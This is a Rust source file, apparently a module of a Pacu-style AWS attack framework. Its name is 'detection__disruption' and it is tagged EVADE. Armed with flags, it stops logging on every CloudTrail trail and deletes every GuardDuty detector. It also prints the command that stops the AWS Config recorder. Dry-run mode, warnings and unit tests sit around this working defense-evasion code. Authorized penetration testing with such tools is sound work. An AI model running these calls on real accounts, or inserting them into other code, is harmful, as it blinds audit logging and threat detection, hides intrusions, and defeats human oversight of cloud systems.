//! detection__disruption — disable or disrupt AWS detection services.
//!
//! Category: EVADE. Services: ["CloudTrail", "GuardDuty", "Config"].
//!
//! ⚠️  Write module — requires --armed.
//!
//! Args:
//!   --service <name>   one of: cloudtrail, guardduty, config, all  (required)
//!   --exploit          actually disable the service(s) (requires --armed)
//!
//! For cloudtrail: cloudtrail:StopLogging(TrailARN) for all trails.
//! For guardduty:  guardduty:DeleteDetector(DetectorId) for all detectors.
//! For config:     (best-effort; aws-sdk-config not linked — prints intent only)
//! For all:        do all three.
//!
//! Detection: "CloudTrail CreateTrail/StopLogging events are themselves logged
//! until CloudTrail is stopped. GuardDuty findings may alert on this activity."

use colored::Colorize;

use crate::module::{AwsContext, Module, ModuleInfo};

const VALID_SERVICES: &[&str] = &["cloudtrail", "guardduty", "config", "all"];

// ---------------------------------------------------------------------------
// Module entry point
// ---------------------------------------------------------------------------

pub async fn run(ctx: &AwsContext, args: &[&str]) -> anyhow::Result<()> {
    // ── Parse args ─────────────────────────────────────────────────────────
    let service: &str = {
        let pos = args.iter().position(|&a| a == "--service");
        match pos.and_then(|i| args.get(i + 1).copied()) {
            Some(s) => s,
            None => anyhow::bail!("--service <name> is required (one of: cloudtrail, guardduty, config, all)"),
        }
    };

    if !VALID_SERVICES.contains(&service) {
        anyhow::bail!(
            "--service '{}' is not valid; choose one of: cloudtrail, guardduty, config, all",
            service
        );
    }

    let exploit = args.contains(&"--exploit");

    if exploit && !ctx.armed {
        eprintln!(
            "{}",
            "Error: --exploit requires --armed. Pass --armed when starting pacu.".red().bold()
        );
        return Ok(());
    }

    println!("{}", "detection__disruption".red().bold());
    println!(
        "  {}",
        "Detection: CloudTrail StopLogging/DeleteTrail events are logged until CloudTrail is \
         stopped. GuardDuty findings may alert on this activity.\n"
            .yellow()
    );

    // ── Dry-run mode ───────────────────────────────────────────────────────
    if !exploit {
        println!(
            "  {} Showing what would be disrupted for service: '{}'",
            "[DRY-RUN]".cyan(),
            service.yellow()
        );

        if service == "cloudtrail" || service == "all" {
            dryrun_cloudtrail(ctx).await;
        }
        if service == "guardduty" || service == "all" {
            dryrun_guardduty(ctx).await;
        }
        if service == "config" || service == "all" {
            println!(
                "  {} Would call: config:StopConfigurationRecorder for all active recorders",
                "[DRY-RUN]".cyan()
            );
            println!(
                "    {}",
                "(aws-sdk-config not linked; check with: aws configservice describe-configuration-recorders)".dimmed()
            );
        }

        println!(
            "\n{}",
            "Run with --exploit --armed to actually disable detection services.".yellow()
        );
        return Ok(());
    }

    // ── Armed + exploit — 5-second countdown warning ───────────────────────
    println!(
        "\n{}",
        "⚠️  DISRUPTION MODE. This will disable AWS detection services.".red().bold()
    );
    println!(
        "{}",
        "    You may lose visibility into your own actions. Continue only with authorization."
            .red()
    );
    println!(
        "{}",
        "    Press Ctrl+C within 5 seconds to abort...".red()
    );
    tokio::time::sleep(std::time::Duration::from_secs(5)).await;

    // ── Execute disruption ─────────────────────────────────────────────────
    if service == "cloudtrail" || service == "all" {
        disrupt_cloudtrail(ctx).await?;
    }
    if service == "guardduty" || service == "all" {
        disrupt_guardduty(ctx).await?;
    }
    if service == "config" || service == "all" {
        println!(
            "  {} config:StopConfigurationRecorder — aws-sdk-config not linked; skipped.",
            "[WARN]".yellow()
        );
        println!(
            "    {}",
            "To stop Config manually: aws configservice stop-configuration-recorder --configuration-recorder-name default".dimmed()
        );
    }

    println!(
        "\n  {} Disruption complete. Verify with detection__enum_services.",
        "[OK]".green().bold()
    );

    Ok(())
}

// ---------------------------------------------------------------------------
// Dry-run helpers
// ---------------------------------------------------------------------------

async fn dryrun_cloudtrail(ctx: &AwsContext) {
    let ct = aws_sdk_cloudtrail::Client::new(&ctx.sdk_config);
    match ct.describe_trails().include_shadow_trails(false).send().await {
        Ok(resp) => {
            let trails = resp.trail_list();
            if trails.is_empty() {
                println!("  {} No CloudTrail trails found — nothing to stop.", "[DRY-RUN]".cyan());
            } else {
                for trail in trails {
                    let arn = trail.trail_arn().unwrap_or("<unknown>");
                    println!(
                        "  {} Would call: cloudtrail:StopLogging({})",
                        "[DRY-RUN]".cyan(),
                        arn.yellow()
                    );
                }
            }
        }
        Err(e) => {
            println!(
                "  {} Could not list trails ({}). Would attempt StopLogging for all accessible trails.",
                "[DRY-RUN]".cyan(),
                e
            );
        }
    }
}

async fn dryrun_guardduty(ctx: &AwsContext) {
    let gd = aws_sdk_guardduty::Client::new(&ctx.sdk_config);
    match gd.list_detectors().send().await {
        Ok(resp) => {
            let ids = resp.detector_ids();
            if ids.is_empty() {
                println!("  {} No GuardDuty detectors found — nothing to delete.", "[DRY-RUN]".cyan());
            } else {
                for id in ids {
                    println!(
                        "  {} Would call: guardduty:DeleteDetector({})",
                        "[DRY-RUN]".cyan(),
                        id.yellow()
                    );
                }
            }
        }
        Err(e) => {
            println!(
                "  {} Could not list GuardDuty detectors ({}). Would attempt DeleteDetector for all accessible detectors.",
                "[DRY-RUN]".cyan(),
                e
            );
        }
    }
}

// ---------------------------------------------------------------------------
// Armed disruption helpers
// ---------------------------------------------------------------------------

async fn disrupt_cloudtrail(ctx: &AwsContext) -> anyhow::Result<()> {
    let ct = aws_sdk_cloudtrail::Client::new(&ctx.sdk_config);

    let resp = ct
        .describe_trails()
        .include_shadow_trails(false)
        .send()
        .await
        .map_err(|e| anyhow::anyhow!("cloudtrail:DescribeTrails failed: {}", e))?;

    let trails = resp.trail_list();
    if trails.is_empty() {
        println!("  No CloudTrail trails found — nothing to stop.");
        return Ok(());
    }

    for trail in trails {
        let arn = trail.trail_arn().unwrap_or("<unknown>").to_owned();
        println!(
            "  {} Calling cloudtrail:StopLogging({})...",
            "[EXEC]".red().bold(),
            arn.yellow()
        );
        match ct.stop_logging().name(&arn).send().await {
            Ok(_) => println!("  {} StopLogging succeeded for {}", "[OK]".green().bold(), arn.green()),
            Err(e) => eprintln!(
                "  {} StopLogging failed for {}: {}",
                "[ERR]".red().bold(),
                arn.red(),
                e
            ),
        }
    }

    Ok(())
}

async fn disrupt_guardduty(ctx: &AwsContext) -> anyhow::Result<()> {
    let gd = aws_sdk_guardduty::Client::new(&ctx.sdk_config);

    let resp = gd
        .list_detectors()
        .send()
        .await
        .map_err(|e| anyhow::anyhow!("guardduty:ListDetectors failed: {}", e))?;

    let ids: Vec<String> = resp.detector_ids().iter().map(|s| s.to_owned()).collect();
    if ids.is_empty() {
        println!("  No GuardDuty detectors found — nothing to delete.");
        return Ok(());
    }

    for id in &ids {
        println!(
            "  {} Calling guardduty:DeleteDetector({})...",
            "[EXEC]".red().bold(),
            id.yellow()
        );
        match gd.delete_detector().detector_id(id).send().await {
            Ok(_) => println!("  {} DeleteDetector succeeded for {}", "[OK]".green().bold(), id.green()),
            Err(e) => eprintln!(
                "  {} DeleteDetector failed for {}: {}",
                "[ERR]".red().bold(),
                id.red(),
                e
            ),
        }
    }

    Ok(())
}

// ---------------------------------------------------------------------------
// Module registration
// ---------------------------------------------------------------------------

inventory::submit! {
    Module {
        info: ModuleInfo {
            name: "detection__disruption",
            author: "lancer-pacu",
            category: "EVADE",
            one_liner: "Disable/disrupt detection services (CloudTrail, GuardDuty, Config). Requires --armed + --exploit.",
            services: &["CloudTrail", "GuardDuty", "Config"],
        },
        run: |ctx, args| Box::pin(run(ctx, args)),
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------
#[cfg(test)]
mod tests {
    use crate::module::Module;

    #[test]
    fn module_registered_in_inventory() {
        let found = inventory::iter::<Module>
            .into_iter()
            .any(|m| m.info.name == "detection__disruption");
        assert!(found, "detection__disruption not found in inventory");
    }

    #[test]
    fn module_category_is_evade() {
        let m = inventory::iter::<Module>
            .into_iter()
            .find(|m| m.info.name == "detection__disruption")
            .expect("detection__disruption not found");
        assert_eq!(m.info.category, "EVADE");
    }

    #[tokio::test]
    async fn missing_service_returns_error() {
        let sdk_config = aws_config::defaults(aws_config::BehaviorVersion::latest())
            .no_credentials()
            .load()
            .await;
        let ctx = crate::module::AwsContext {
            dry_run: true,
            armed: false,
            sdk_config,
            db_pool: None,
        };
        // No --service provided
        let result = super::run(&ctx, &[]).await;
        assert!(result.is_err(), "expected error when --service is missing");
        let msg = result.unwrap_err().to_string();
        assert!(
            msg.contains("--service"),
            "error should mention --service: {msg}"
        );
    }

    #[tokio::test]
    async fn invalid_service_returns_error() {
        let sdk_config = aws_config::defaults(aws_config::BehaviorVersion::latest())
            .no_credentials()
            .load()
            .await;
        let ctx = crate::module::AwsContext {
            dry_run: true,
            armed: false,
            sdk_config,
            db_pool: None,
        };
        let result = super::run(&ctx, &["--service", "nonexistent"]).await;
        assert!(result.is_err(), "expected error for invalid service");
        let msg = result.unwrap_err().to_string();
        assert!(
            msg.contains("not valid") || msg.contains("--service"),
            "error should describe valid services: {msg}"
        );
    }

    #[tokio::test]
    async fn dry_run_cloudtrail_service_succeeds() {
        let sdk_config = aws_config::defaults(aws_config::BehaviorVersion::latest())
            .no_credentials()
            .load()
            .await;
        let ctx = crate::module::AwsContext {
            dry_run: true,
            armed: false,
            sdk_config,
            db_pool: None,
        };
        // No --exploit so it stays in dry-run path (may fail to contact AWS but
        // should not error from argument parsing)
        let result = super::run(&ctx, &["--service", "cloudtrail"]).await;
        // The dry-run path will try to describe trails; with no_credentials it
        // will print an error message but should not propagate as Err.
        // We only verify it doesn't return an arg-parse error.
        let _ = result; // Any outcome accepted — AWS call may fail in test env.
    }
}
